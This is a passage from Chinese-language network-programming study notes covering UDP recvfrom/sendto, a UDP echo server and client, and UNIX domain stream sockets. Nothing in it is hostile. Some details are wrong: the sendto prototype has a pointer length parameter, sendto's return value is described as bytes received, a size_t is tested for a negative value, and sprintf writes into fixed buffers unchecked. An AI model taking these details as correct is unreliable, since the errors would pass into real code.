套接字之后，绑定到本地端口，调用 <code>recvfrom</code> 函数等待客户端的报文发送</li><li>客户端创建套接字之后，调用 <code>sendto</code> 函数往目标地址和端口发送 UDP 报文，然后客户端和服务器端进入互相应答过程</li></ul></li></ul><p>​</p><p>​</p><h4 id="主要函数">主要函数</h4><h5 id="recvfrom">recvfrom</h5><ul><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span> ssize_t <span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> size_t nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> 　　　　　　　　　　<span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>sockfd</code> 是本地创建的套接字描述符</p></li><li><p><code>buff</code> 指向本地的缓存</p></li><li><p><code>nbytes</code> 表示最大接收数据字节</p></li><li><p><code>flags</code> 是和 I/O 相关的参数</p></li><li><p><code>from</code> 和 <code>addrlen</code>，实际上是返回对端发送方的地址和端口等信息</p></li><li><p>函数返回值告诉我们实际接收的字节数</p></li></ul><blockquote><p>和 TCP 是通过 accept 函数拿到的描述字信息来决定对端的信息不一样，UDP 报文每次接收都会获取对端的信息，报文和报文之间是没有上下文的</p></blockquote></li></ul><p>​</p><h5 id="sendto">sendto</h5><ul><li><p>原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h&gt;</span></span> ssize_t <span class="token function">sendto</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> size_t nbytes<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>sockfd</code> 是本地创建的套接字描述符</p></li><li><p><code>buff</code> 指向发送的缓存</p></li><li><p><code>nbytes</code> 表示发送字节数</p></li><li><p><code>to</code> 和 <code>addrlen</code>表示发送的对端地址和端口等信息</p></li><li><p>函数的返回值告诉实际接收的字节数</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="实验-3">实验</h4><ul><li><p><em>udp_server.c</em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token keyword">static</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">recvfrom_int</span><span class="token punctuation">(</span><span class="token keyword">int</span> signo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nreceived %d datagrams\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        socklen_t client_len<span class="token punctuation">;</span>    <span class="token keyword">char</span> message<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> recvfrom_int<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 信号处理响应“Ctrl+C”退出时打印出收到的报文总数</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> client_addr<span class="token punctuation">;</span>    client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 获取客户端发送的报文，加上“Hi”前缀发送给客户端</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> message<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        message<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"received %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span><span class="token punctuation">;</span>                count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><ul><li><p><em>udp_client.c</em>：从标准输入中读取输入的字符串后，发送给服务端，并且把服务端经过处理的报文打印到标准输出上</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span>    <span class="token expression">MAXLINE     <span class="token number">4096</span></span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: udpclient &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     socklen_t server_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>reply_addr<span class="token punctuation">;</span>    reply_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span> recv_line<span class="token punctuation">[</span>MAXLINE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t len<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending %s\n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        size_t rt <span class="token operator">=</span> <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"send failed "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"send bytes: %zu \n"</span><span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>         len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> reply_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"recvfrom failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><ul><li><p>场景一：只运行客户端</p><p><img src="20210329-101753.png" alt=""></p><p>只运行客户端，程序会一直阻塞在 <code>recvfrom</code> 上</p></li><li><p>场景二：先开启服务端，再开启客户端</p><p><img src="20210329-105644.png" alt=""></p></li><li><p>场景三: 开启服务端，再一次开启两个客户端</p><p><img src="20210329-200937.png" alt="server"></p><p><img src="20210329-201010.png" alt="client"></p><p>两个客户端发送的报文依次被服务端收到，客户端也可以收到服务端处理之后的报文，如果此时把服务器端进程杀死，可以看到打印出服务器端接收到的报文个数</p><p>之后再重启服务器端进程，并使用客户端 1 和客户端 2 继续发送新的报文，服务器端可以继续收到客户端的报文（说明 UDP 报文无上下文）</p></li></ul><blockquote><p>在第一个场景中 <code>recvfrom</code> 一直处于阻塞状态中，这是非常不合理的，这种情形应该怎么处理呢？</p><p>一直阻塞会导致程序无法正常退出，可以使用接收超时、IO多路复用的<strong>超时机制</strong></p></blockquote><blockquote><p>UDP 是请求 - 应答模式的，那么请求中的 <strong>UDP 报文最大</strong>可以是多大呢？</p><p>IP和UDP头中都有16bit的长度字段，最长65535字节，去掉头部长度得到UDP数据净荷长度：65535-20-8=65507字节</p></blockquote></li></ul><p>​</p><p>​</p><h3 id="1-7-本地套接字">1.7 本地套接字</h3><p>​</p><p>​</p><h4 id="1-7-0-示例">1.7.0 示例</h4><ul><li><p>实际上本地套接字是 IPC 的一种实现方式，因为本地套接字开发便捷，接受度高，普遍适用于在同一台主机上进程间通信的各种场景</p></li><li><p>比如 Kubernetes 的 <strong>CRI</strong> <code>Container Runtime Interface</code>，其思想是将 Kubernetes 的主要逻辑和 Container Runtime 的实现解耦</p></li><li><p>kubelet 是 Kubernetes 的一个组件，负责将控制器和调度器的命令转化为单机上的容器实例，为了实现和容器运行时的解耦，kubelet 设计了基于本地套接字的客户端 - 服务器 GRPC 调用，在路径为 <em>/var/run/dockershim.socket</em> 的 stream 类型的本地套接字上可以看到开启这个套接字的进程为 kubelet（还有 docker-containerd.sock 等其他本地套接字）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210330-kubelet.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="1-7-1-本地套接字概述">1.7.1 本地套接字概述</h4><ul><li>本地套接字也叫做 UNIX 域套接字，是一种特殊类型的套接字，本地套接字提供了一种<strong>单主机跨进程间调用的手段</strong>，减少了协议栈实现的复杂度，效率更高</li><li>类似的 IPC 机制还有 UNIX 管道、共享内存和 RPC 调用等</li><li>本地套接字的编程接口和 IPv4、IPv6 套接字编程接口是一致的，可以支持字节流和数据报两种协议</li></ul><p>​</p><p>​</p><h4 id="1-7-2-本地字节流套接字">1.7.2 本地字节流套接字</h4><ul><li><p>示例：服务器程序打开本地套接字后，接收客户端发送来的字节流，并往客户端回送了新的字节流</p></li><li><p>服务端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixstreamserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span> connfd<span class="token punctuation">;</span>    socklen_t clilen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> cliaddr<span class="token punctuation">,</span> servaddr<span class="token punctuation">;</span>     listenfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>listenfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token comment">// 创建一个本地地址</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// unlink 把存在的文件删除以保持幂等性</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置本地文件路径</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">listen</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> LISTENQ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"listen failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     clilen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cliaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>cliaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clilen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EINTR<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"accept failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* back to for() */</span>        <span class="token keyword">else</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"accept failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 使用 read 和 write 从套接字中按照字节流的方式读取和发送数据</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> nbytes <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>本地字节流套接字识别服务器不再通过 IP 地址和端口，而是通过本地文件</li><li>本地文件路径应该是绝对路径，这样的话编写好的程序可以在任何目录里被启动和管理，如果是相对路径，这个程序的启动路径就必须固定，对程序的管理反而是一个很大的负担</li><li>如果文件不存在，bind 时会自动创建这个文件</li></ul></li><li><p>客户端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixstreamclient &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>     sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  